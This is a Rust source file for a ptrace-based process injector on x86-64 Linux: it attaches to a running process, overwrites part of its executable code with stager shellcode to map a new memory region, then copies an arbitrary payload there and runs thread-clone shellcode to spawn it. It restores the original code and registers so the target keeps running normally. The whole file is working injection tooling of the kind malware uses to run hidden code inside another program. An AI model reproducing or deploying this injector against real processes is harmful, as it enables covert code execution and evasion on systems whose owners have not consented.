use libprocmem::{Proc, Region, EXEC_PERM};
use std::io;
use std::io::{Error, ErrorKind};
use nix::sys::wait::wait;
use nix::sys::ptrace;
use nix::sys::ptrace::AddressType;
use nix::sys::wait::WaitStatus;
use nix::sys::signal::Signal;
use nix::unistd::Pid;
use libc::c_void;


extern crate capstone;
use capstone::prelude::*;


/// print out the current instructions in buffer `buf` using
/// `pc` as the starting address
fn print_insts(buf: &[u8], pc: u64) -> io::Result<()> {

    let cs = Capstone::new()
        .x86()
        .mode(arch::x86::ArchMode::Mode64)
        .syntax(arch::x86::ArchSyntax::Intel)
        .detail(true)
        .build()
        .expect("failed to create capstone object");

    let insns = cs.disasm_all(buf, pc)
        .expect("failed to disassemble");

    println!("found {} instructions", insns.len());
    for i in insns.as_ref() {
        println!("{}", i);
    }

    Ok(())

}



/// a bunch of breakpoints to use for padding payload region
const BREAKPOINT: u64 = 0xcccccccccccccccc;

/// convert a `Vec<u8>` to a `Vec<u64>`
fn vec_conversion(mut buf: Vec<u8>) -> Vec<u64> {

    let mut new_buf: Vec<u64> = Vec::new();
    let size = buf.len() + (8-(buf.len() % 8));
    let mut qword: u64 = 0;

    buf.resize(size, 0xcc);

    let mut val = 0;
    for idx in 0..size {
        let mut data = buf[idx] as u64;
        data = data << val;
        qword = qword + data; 
        //println!("{:x}", qword);
        if (idx+1) % 8 == 0 { 
            new_buf.push(qword);
            qword = 0;
            val = 0;
         } else {
             val += 8
        }

    }

    new_buf
}

/// convert a `Vec<u64>` to a `Vec<u8>`
fn vec_bytes(mut buf: Vec<u64>) -> Vec<u8> {
    
    let mut bytes = Vec::with_capacity(8 * buf.len());

    for value in buf {
        bytes.extend(&value.to_be_bytes());
    }
    bytes
}


/// Injector
/// inject into a running process the stager shellcode and the final payload code 
/// Note: need to write a better stager for threading and test the final payload
pub struct Injector {
    /// pid of the process to inject into
    pub pid: Pid,
    /// region to load the desired payload we are injection
    pub payload_region: usize,
}


impl Injector {

    /// Create a new Injector instance for the target process `pid`
    pub fn new(pid: Pid) -> Self {
        Injector {
            pid: pid,
            payload_region: 0,
        }
    }

    /// Copy `len` bytes from the associated process `pid` at `src_address` and return those bytes  
    fn copy_from_process(&self, src_address: AddressType, len: usize) -> io::Result<Vec<u64>> {

        let mut buf: Vec<u64> = Vec::new();

        for offset in 0..len {
            let addr = src_address as usize + (offset * 8);
            println!("reading from 0x{:08x}", addr);
            let data = ptrace::read(self.pid, addr as AddressType)?;
            buf.push(data as u64);
        }

        Ok(buf)
    }

    /// Copy bytes `buf` into the associated process `pid` at `src_address`
    fn copy_into_process(&self, src_address: AddressType, buf: &[u64]) -> io::Result<()> {

        let size = buf.len();
        let buf = buf.clone();

        for offset in 0..size {
            let addr = src_address as usize + (offset *8);
            let qword = buf[offset];
            unsafe {
                println!("writing to 0x{:8x} data: 0x{:8x}", addr, qword);
                ptrace::write(self.pid, addr as AddressType, qword as *mut c_void)?;
            }
        }

        Ok(())
    }


    /// attach to a process
    pub fn attach_pid(&self) -> io::Result<()> {

        ptrace::attach(self.pid).expect("failed to attach");

        Ok(())
    }

    /// run_shellcode
    /// inject the shellcode into the running process and run the shellcode
    /// return value of the rax after the shellcode ran
    fn run_shellcode(&self, shellcode: &[u64]) -> io::Result<usize> {

        let mut regs = ptrace::getregs(self.pid).unwrap();
        let orig_regs = regs.clone();
        let exec_region = self.find_exec_region().unwrap();
        let size = shellcode.len()+1; 
        //let pc = regs.rip as AddressType;
        let pc = exec_region.start_address as AddressType;

        // save the orig code before writing and write the stager
        let orig_buf = self.copy_from_process(pc as AddressType, size).unwrap();

        // add a breakpoint at the end
        //let mut shellcode = Vec::from(shellcode);
        //shellcode.push(0x90);
        //shellcode.push(BREAKPOINT);

        self.copy_into_process(pc as AddressType, &shellcode).unwrap();
        regs.rip = pc as u64;
        ptrace::setregs(self.pid, regs).unwrap();

        ptrace::cont(self.pid, None).expect("failed to continue process");

        // wait for the SIGTRAP
        // NOTE: Add handling of other crashes
        let status = wait().unwrap();

        
        println!("run_shellcode status: {:?}", status);
        let new_regs = ptrace::getregs(self.pid).unwrap();
        println!("pid: {}  rax: {:08x}", self.pid, new_regs.rax);

        // restore orignal state
        self.copy_into_process(pc as AddressType, &orig_buf).unwrap();
        ptrace::setregs(self.pid, orig_regs).unwrap();

        Ok(new_regs.rax as usize)
    }

    /// find a executable text segement inside the main binary and not any library code in order to
    /// avoid messing with library sections
    pub fn find_exec_region(&self) -> io::Result<Region> {

        let regions = Proc::optain_regions(self.pid).unwrap();

        let region = regions.iter().find(|&r| {
            // avoid injecting into a library process
            // doing this causes problems 
            if r.start_address < 0x700000000000 {
                (r.perms & EXEC_PERM) != 0 
            } else {
                false
            }
        }).unwrap();
    
        Ok(region.clone())
    }


    /// run the mmap shellcode to create a region we can run stuff in 
    pub fn run_mmap(&mut self) -> io::Result<()> {
        let mmap = include_bytes!("../rsrc/mmap.bin").to_vec();
        let mmap = vec_conversion(mmap);
        let region_addr = self.run_shellcode(&mmap);

        // print new regions of pid
        let proc = Proc::new(self.pid).unwrap();
        proc.print_regions();

        self.payload_region = region_addr.unwrap();

        Ok(())
    }

    /// inject the payload into the process at the given address
    pub fn inject_payload_and_spawn(&mut self, payload: &[u8]) -> io::Result<()> {

        let payload = vec_conversion(payload.to_vec());
        let thread_clone = include_bytes!("../rsrc/thread_clone.bin").to_vec();
        let thread_clone = vec_conversion(thread_clone);
        let addr = self.payload_region as AddressType;
        let backup_regs = ptrace::getregs(self.pid).unwrap();
        let mut regs = backup_regs.clone();

        self.copy_into_process(addr, &payload).unwrap();

        regs.r11 = self.payload_region as u64;
        ptrace::setregs(self.pid, regs).unwrap();
        println!("running thread clone shellcode");
        let _ret = self.run_shellcode(&thread_clone).unwrap();
        ptrace::setregs(self.pid, backup_regs).unwrap();
        println!("returning to normal flow");

        Ok(())
    }
}

